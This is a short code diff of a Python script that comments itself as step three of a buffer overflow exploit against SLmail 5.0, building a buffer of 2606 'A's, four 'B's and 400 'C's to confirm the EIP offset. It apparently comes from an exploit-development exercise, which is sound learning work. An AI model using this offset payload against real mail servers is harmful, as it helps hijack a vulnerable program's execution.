@@ -1,5 +1,8 @@
 #! /usr/bin/python
 
+# This code is an exploit for third step of the BOF attack to SLmail 5.0.
+# It verifies the postion of EIP found in previous step. 
+
 import socket
 
 buffer=('A'*2606 +'B'*4+'c'*400)
